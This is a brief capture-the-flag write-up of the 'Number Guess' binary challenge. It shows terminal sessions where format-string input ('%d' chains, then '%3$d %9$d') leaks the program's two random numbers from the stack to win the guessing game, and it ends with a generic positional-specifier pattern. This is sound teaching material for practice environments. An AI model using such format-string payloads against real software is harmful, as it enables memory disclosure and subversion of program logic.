Number Guess
binary, 70

Ian loves playing number guessing games, so he went ahead and wrote one himself (source). I hope it doesn't have any vulns. The service is running at nc shell.angstromctf.com 1235.

ser@4005fe92be0b /data/binary/number_guess $ ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max):
%d %d %d %d %d %d %d %d %d
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
-1209495452 1593 671288 2037461464 2037461568 -1209495128 0 4196944 24318's
guess:

user@4005fe92be0b /data/binary/number_guess $ ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max):
%3$d %9$d
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
449701 696324's guess: 1146025 

16:21:03: %[STACK_FRAME#]$d 
